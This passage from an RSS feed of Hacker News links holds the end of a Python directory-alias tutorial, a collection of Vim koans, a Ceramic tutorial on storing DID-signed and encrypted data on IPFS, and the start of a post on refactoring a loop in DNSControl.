        gotoState<span>.</span>list_aliases()

</code></pre></div><p>Testing list</p>
<div><pre><code data-lang="bash">
python state.py list
root::::/

</code></pre></div><p>Next we add the <strong>rm</strong> method for removing aliases from the state file</p>
<p>Method Code:</p>
<div><pre><code data-lang="python">

    <span>def</span> <span>rm</span>(self, alias):
        <span>if</span> self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>get(alias):
            self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>pop(alias)
            self<span>.</span>update_conf(
                docFile<span>=</span>self<span>.</span>stateEnvFile, 
                docCont<span>=</span>self<span>.</span>stateEnv
            )
        <span>else</span>:
            <span>print</span>(<span>"Alias: </span><span>%s</span><span> does not exist"</span> <span>%</span> alias)

</code></pre></div><p>Respective <strong><strong>main</strong></strong> argv condition</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"rm"</span>:
        gotoState<span>.</span>rm(argv[<span>2</span>])

</code></pre></div><p>Next we add the <strong>check</strong> and <strong>get</strong> methods</p>
<ul>
<li>check: Checks if an alias exists</li>
<li>get: returns back to the caller the alias path</li>
</ul>
<p>Methods Code:</p>
<div><pre><code data-lang="python">
    <span>def</span> <span>get</span>(self, alias):
        <span>print</span>(self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>get(alias, None))

    <span>def</span> <span>check</span>(self, alias):
        get_alias <span>=</span> self<span>.</span>stateEnv[<span>"aliases"</span>]<span>.</span>get(alias, None)
        <span>if</span> get_alias:
            <span>print</span>(<span>"</span><span>%s</span><span>::::</span><span>%s</span><span>"</span> <span>%</span> (True, get_alias))
        <span>else</span>:
            <span>print</span>(<span>"</span><span>%s</span><span>::::</span><span>%s</span><span>"</span> <span>%</span> (False, get_alias))


</code></pre></div><p>Here again I am adding <strong>::::</strong> as a separator for the caller</p>
<p>Respective <strong><strong>main</strong></strong> argv condition</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"rm"</span>:
        gotoState<span>.</span>rm(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"get"</span>:
        gotoState<span>.</span>get(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check"</span>:
        gotoState<span>.</span>check(argv[<span>2</span>])

</code></pre></div><p>Testing <strong>rm check and get</strong></p>
<div><pre><code data-lang="bash">
python3 state.py check root
True::::/

python3 state.py get root
/

python3 state.py rm root
python state.py list

</code></pre></div><p>Finally we will add the last two methods <strong>set_workdir</strong> and <strong>get_workdir</strong>. At the begining we claimed that we will be able
to set a project dir and navigate through its directories freely.</p>
<p>Methods Code:</p>
<div><pre><code data-lang="python">
    <span>def</span> <span>set_workdir</span>(self, path):
        cpath <span>=</span> self<span>.</span>check_paths(path, opts<span>=</span>{})
        self<span>.</span>stateEnv[<span>"workdir"</span>] <span>=</span> cpath
        self<span>.</span>update_conf(
            docFile<span>=</span>self<span>.</span>stateEnvFile,
            docCont<span>=</span>self<span>.</span>stateEnv
        )

    <span>def</span> <span>get_workdir</span>(self):
        workdir <span>=</span> self<span>.</span>stateEnv<span>.</span>get(<span>"workdir"</span>, None)
        <span>if</span> workdir <span>==</span> None:
            self<span>.</span>set_workdir(self<span>.</span>rootDir)
            <span>print</span>(self<span>.</span>rootDir)
        <span>else</span>:
            <span>print</span>(workdir)

</code></pre></div><p>Respective <strong><strong>main</strong></strong> argv condition</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
        gotoState<span>.</span>list_aliases()
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"rm"</span>:
        gotoState<span>.</span>rm(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"get"</span>:
        gotoState<span>.</span>get(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check"</span>:
        gotoState<span>.</span>check(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"set_workdir"</span>:
        gotoState<span>.</span>set_workdir(argv[<span>2</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"get_workdir"</span>:
        gotoState<span>.</span>get_workdir()

</code></pre></div><p>We will not test these for now because they do not have a value right now without the caller script.
For convenience the whole code of <strong>state.py</strong> is here <a href="https://github.com/ulfox/goto/blob/main/state.py">State.py Code</a></p>
<p>We next move to the caller script</p>
<h2 id="the-goto-script">The Goto â€¦</h2></div></main></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.primef.org/posts/2020-11-16/directory-aliases/">https://blog.primef.org/posts/2020-11-16/directory-aliases/</a></em></p>]]>
            </description>
            <link>https://blog.primef.org/posts/2020-11-16/directory-aliases/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149721</guid>
            <pubDate>Thu, 19 Nov 2020 14:23:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vim Koans]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149640">thread link</a>) | @manjana
<br/>
November 19, 2020 | https://sanctum.geek.nz/arabesque/vim-koans/ | <a href="https://web.archive.org/web/*/https://sanctum.geek.nz/arabesque/vim-koans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><em>These koans have been independently translated into <a href="https://web-beta.archive.org/web/20160313124308/http://ranmocy.me/translation/vim-koans/">Chinese</a>,
thanks to Wanzhang Sheng, and into <a href="http://silly-bytes.blogspot.com/2016/05/vim-koans-espanol.html">Spanish</a>, thanks to Daniel Campoverde CarriÃ³n.</em></p>

<p><em>See also: <a href="https://blog.samwhited.com/2015/04/the-dharma-of-vi/">The Dharma of Vi</a>, <a href="https://sanctum.geek.nz/etc/emperor-sh-and-the-traveller.txt">Emperor Sh and the Traveller</a></em></p>

<h2>Master Wq and the Windows developer</h2>

<p>Master Wq was addressing some Vim novices. After his lecture on the many
virtues of Vim, he asked if there were any questions. A young man raised his
hand.</p>

<p>â€œMaster, by what means might one filter for the second column of a plaintext
table for all rows that contain the string â€˜tcpâ€™?â€</p>

<p>Master Wq said nothing, turned to the whiteboard behind him, and wrote:</p>

<pre><code>:%!awk '/tcp/{print $2}'
</code></pre>

<p>There was a murmur of approval from the other students.</p>

<p>â€œBut I develop on Windows â€¦ â€ the student stammered.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>:v/tcp/d
:v/^\s*\S\+\s\+\(\S\+\).*/d
:%s//\1/
</code></pre>

<p>â€œWhat! That is far too complex for such a simple task!â€ cried the student.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>Microsoft Excel
</code></pre>

<p>At once, the student was enlightened.</p>

<hr>

<h2>No ultimate difference</h2>

<p>One day a monk visited Master Wq, and inquired, â€œMaster, how will my code be
different when I have mastered Vim?â€</p>

<p>Master Wq answered, â€œBefore Vim: declare, define, process, print. After Vim:
declare, define, process, print.â€</p>

<hr>

<h2>Master Wq and the Markdown acolyte</h2>

<p>A Markdown acolyte came to Master Wq to demonstrate his Vim plugin.</p>

<p>â€œSee, master,â€ he said, â€œI have nearly finished the Vim macros that translate
Markdown into HTML. My functions interweave, my parser is a paragon of
efficiency, and the results nearly flawless. I daresay I have mastered
Vimscript, and my work will validate Vim as a modern editor for the enlightened
developer! Have I done rightly?â€</p>

<p>Master Wq read the acolyteâ€™s code for several minutes without saying anything.
Then he opened a Markdown document, and typed:</p>

<pre><code>:%!markdown
</code></pre>

<p>HTML filled the buffer instantly. The acolyte began to cry.</p>

<hr>

<h2>Master Wq and the Unix master</h2>

<p>An old Unix master came to Master Wq. â€œI am troubled, Wq. You teach the way of
Vim. vi is holy but Vim is not; its code sprawls, its features crowd memory;
its binaries are vast, its behavior inconsistent. This is not the way of Unix.
I fear you mislead your students. What can be done?â€</p>

<p>Master Wq nodded. â€œYou are right,â€ he said. â€œVim is broken. Let us fix it.
Shall we begin?â€</p>

<p>The old Unix master agreed, and opened a shell. He typed:</p>

<pre><code>$ vi vim.c
</code></pre>

<p>He began to code. Master Wq watched for a while and then asked him, â€œWhich
implementation of vi are you using? Nvi? Vim? Elvis?â€</p>

<p>â€œI donâ€™t know,â€ said the Unix master. â€œIt doesnâ€™t matter.â€</p>

<p>Master Wq nodded. The Unix master sat stunned for a moment and closed his
document unsaved.</p>

<hr>

<h2>No greatest tool</h2>

<p>One night there was a storm, and Master Wqâ€™s house collapsed. The next morning
he began to build it again using his old tools. His novice came to help him,
and they built for a while and were making good progress. As they worked, the
novice began to tell Master Wq of his latest accomplishments.</p>

<p>â€œMaster, I have developed a wonderful Vim script to give all sorts of useful
information about a document. It counts the words, the sentences, the
paragraphs, and even tells you what kind of document it is using the syntax
highlighting rules. I use it in my pipelines all the time. It is a thing of
beauty, and I am very proud. Truly, Vim is the greatest tool!â€</p>

<p>Master Wq did not reply. Thinking he had unwittingly angered his master, the
novice fell silent and continued his work.</p>

<p>The novice finished aligning two beams and had positioned a nail ready for
beating into the wood, but found the hammer was out of reach.</p>

<p>â€œWould you pass me the hammer, master?â€</p>

<p>Master Wq handed the novice a saw.</p>

<p>At once, the novice was enlightened.</p>

<hr>

<h2>Master Popeâ€™s dream</h2>

<p><a href="https://github.com/tpope">Master Pope</a> once dreamt he was an Emacs user. When he awoke, he exclaimed:</p>

<p>â€œI do not know if I am Tim Pope dreaming I am an Emacs user, or an Emacs
user dreaming I am Tim Pope!â€</p>

<hr>

<h2>The superior editor</h2>

<p><a href="http://vimcasts.org/">Master Neil</a> and <a href="http://derekwyatt.org/">Master Wyatt</a> were famous for their instruction in the
ways of Vim, and travelled around the country teaching.</p>

<p>One day a student asked them, â€œMaster Neil speaks calmly and evenly, his accent
carefully lilting over his words, as though planned down to the syllable. But
Master Wyatt is full of enthusiasm, he starts and stops, his speech is rapid
and energetic, and his soul flows into his lectures. Which is the superior way
of teaching Vim?â€</p>

<p>Masters Neil and Wyatt answered in unison, â€œWhich is the superior editor: vi or
ex?â€</p>

<p>At once, several students were enlightened.</p>

<hr>

<h2>The slow studentâ€™s despair</h2>

<p>Master Wq was eating his luncheon when a student burst into his room and knelt
at his feet. Tears were in his eyes and he seemed profoundly frustrated. Master
Wq put down his bowl and asked, â€œWhat upsets you so, young man?â€</p>

<p>â€œMaster,â€ he said. â€œI give up. I will never attain mastery of Vim! I will never
learn the ways of the great patriarchs! I will never attain the brutal
simplicity, the divine emptiness of perfectly efficient Vim usage!â€</p>

<p>â€œWhy do you say this?â€</p>

<p>â€œI am your worst student, by far. When I am struggling with writing a simple
macro, my fellow students are writing recursive macros with ease. When I am
trying to remember the regular expression for white space characters, my fellow
students are writing cyclomatic complexity tests in Vimscript. I am too slow,
and I am ashamed, and I am afraid I have failed.â€</p>

<p>Master Wq stood up. â€œCome with me to the window,â€ he said.</p>

<p>The student got up and followed Master Wq to the window, and looked across the
street to Master Wqâ€™s neighbourâ€™s house. Through the window, the two could see
a young man in suit and tie, working on a document.</p>

<p>â€œWhat do you see?â€ asked Master Wq. The student watched for a while.</p>

<p>â€œThat young man is using Microsoft Excel to generate a spreadsheet. He is
updating every single cell by hand. He doesnâ€™t even know how to use formulas.
He makes capital letters by pressing Caps Lock, and then pressing it again when
he is done. He is so slow! I do not understand. How can he be so content?â€</p>

<p>â€œSeeing this young man, how can you not be?â€ returned Master Wq.</p>

<p>The student was immediately enlightened. His name was Qa, and he later became
one of the great masters.</p>

<hr>

<h2>Mastery of Vimscript</h2>

<p>A student enquired of Master Wq, â€œWhen will I know I have mastered Vimscript?â€</p>

<p>Master Wq answered, â€œWhen you never use it.â€</p>

<hr>

<h2>The Vim poet</h2>

<p>A young man begged an audience with Master Wq to read him his latest work, an
ode to the glories of Vim. With tearful eyes he read out his heartfelt words,
pouring his soul into his veneration for his text editor.</p>

<p>The master sat and listened to the poet for a while. After the tenth verse, he
held up his hand. â€œPlease, no more. Your poem is awful.â€</p>

<p>The young man was very angry.</p>

<p>â€œMaster Wq, surely you of all people can best appreciate the poem, you who know
the great beauty of the editor. How can you be so terse, so dismissive? I even
wrote this poem in Vim!â€</p>

<p>â€œYou wrote it in Vim,â€ said the Master. â€œBut your meter is uneven, your rhyming
pattern inconsistent, your metaphors mixed. You have written a very bad poem
using a very good tool. You are not a poet, and Vim will not make you one; many
of my students are not programmers, and Vim will not help them either.â€</p>

<p>â€œVim is eternally beautiful,â€ protested the poet. â€œIt is a worthy subject for
an ode.â€</p>

<p>â€œVim is not permanent. nvi is not permanent. vi itself is not permanent, only
vi-nature. Emacs has vi-nature, nano has vi-nature, even Notepad has vi-nature.
You narrow your sights, you grow attached, and hence you do not grasp the true
value of your poemâ€™s subject. You must leave. Come back when you have mastered
Emacs.â€</p>

<p>The poet left, deeply ashamed. He never returned.</p>

<hr>

<h2>Master Wqâ€™s missing name</h2>

<p><em>Contributed by Rafael Beraldo.</em></p>

<p>One afternoon, Master Wq was meditating under a pine tree. He contemplated how
easily the wind moves through leaves and trunks, both moving them and having
its course altered by their presence. A student approached and nervously stood
by. Having finally mustered all the courage she could, the student said:</p>

<p>â€œMaster Wq, I am troubled by what I have seen.â€</p>

<p>The Master looked at her face, and she continued:</p>

<p>â€œI have mastered movement, I have understood macros, I am familiar with the
source and have not touched vimscript. I have followed your every advice,
ruminated on every teaching. Yet, there is something I cannot understand.
Nowhere in Vim have I found your name. Never has anybody thanked you in the
help pages. How can that be? The greatest of all Vim masters, unknown to all?
In a desperate last try, I ran :Wq and the terminal screamed at me:</p>

<pre><code>E492: Not an editor command: Wq.
</code></pre>

<p>My heart is drowned in doubt, and I am ashamed to admit that.â€</p>

<p>Master Wq looked away. After a few moments, he said:</p>

<p>â€œYou think you have committed a great sin. However, the breeze still follows
its path, the leaves make their usual sound and the sky is no greyer.â€</p>

<p>As the great master spoke this, with a sharp pebble he wrote in the dirt:</p>

<pre><code>command! Wq wq
</code></pre>
			</div></div>]]>
            </description>
            <link>https://sanctum.geek.nz/arabesque/vim-koans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149640</guid>
            <pubDate>Thu, 19 Nov 2020 14:15:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Standards for storing signed and encrypted data on IPFS]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25149517">thread link</a>) | @s3n4
<br/>
November 19, 2020 | https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/ | <a href="https://web.archive.org/web/*/https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    â€¦</code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</a></em></p>]]>
            </description>
            <link>https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149517</guid>
            <pubDate>Thu, 19 Nov 2020 14:02:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Refactoring a Loop That Was Trying Too Hard]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25149328">thread link</a>) | @YesThatTom2
<br/>
November 19, 2020 | https://www.yesthatblog.com/post/0085-refactoring-a-loop-that-was-trying-too-hard/ | <a href="https://web.archive.org/web/*/https://www.yesthatblog.com/post/0085-refactoring-a-loop-that-was-trying-too-hard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      <div>
        <div id="content">
          <article>
    
    

    
    

    
    <div>
      <p>I fixed bug last night.</p>
<p>The bug was difficult to fix because the code was so complex. I wasnâ€™t
really able to fix it until I simplified the code. Once the code was
simplified the bug was easy to fix.  While doing this I
found an anti-pattern that I now call â€œOne loop trying too hardâ€.</p>

<p>If <code>A</code> never changes, thenâ€¦</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>for</span> <span>...</span> <span>{</span>
        <span>if</span> <span>A</span> <span>{</span> <span>B</span> <span>}</span> <span>else</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>â€¦is probably best refactored asâ€¦</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>if</span> <span>A</span> <span>{</span>
        <span>for</span> <span>...</span> <span>{</span> <span>B</span> <span>}</span>
    <span>else</span>
        <span>for</span> <span>...</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Why? First of all, you are evaluating <code>A</code> once for each iteration. If
<code>A</code> doesnâ€™t change, thatâ€™s a waste of CPU.  But more importantly, this
is really just two loops that just happened to have the same <code>for ...</code>.  Splitting them out makes the code more readable.</p>
<hr>

<p>I was trying to fix a bug in <a href="http://dnscontrol.org/">DNSControl</a>
related to AWS Route53 DNS updates.</p>
<p>The code had been hacked on my many people over the years to add
support for Route53-style aliases and other things.  It was now very
complex and difficult to understand.</p>
<p>The refactoring didnâ€™t just simplify the code to make it easier to
maintain, I was able to fix some other problems along the way.  For
example, the report of what updates are being performed is now sorted,
which makes it easier for the user to notice irregularities.</p>
<h2 id="sidenote-the-joy-of-automated-integration-tests">Sidenote: The joy of automated integration tests</h2>
<p>Reproducing the bug was easy because DNSControl has an embedded
language for describing test cases. Any bug is first reproduced in
this language. We can run the tests frequently while doing development
so that we know when the bug is fixed.</p>
<p>We never delete the old use-cases. This was we get instant feedback if
there are regressions (i.e. the bug creeping back in).</p>
<p>My favorite aspect of this is that I can make aggressive changes with
confidence: if all the use-cases pass, Iâ€™m pretty sure I havenâ€™t
broken anything, even some obscured edge-case that was observed years
ago.</p>
<p>I took advantage of this many times while working on this bug. In
fact, there was one point where I wasnâ€™t sure if a change should be
done one way or another. I was sleepy and feeling lazy so I just ran
all the tests both ways. One made nearly ever test fail; the other
worked.  I was too sleepy (and lazy) to investigate why, but it didnâ€™t
matter becauseâ€¦ I was sleepy (and lazy).</p>
<p>By the way, these tests are fully automated and accessible to
everyone.  Until a week ago I was the only person that could run the
full suite of tests. However last week my awesome coworker Max
configured Github Actions so that <a href="https://github.com/StackExchange/dnscontrol/actions/runs/359162543">all the tests</a>
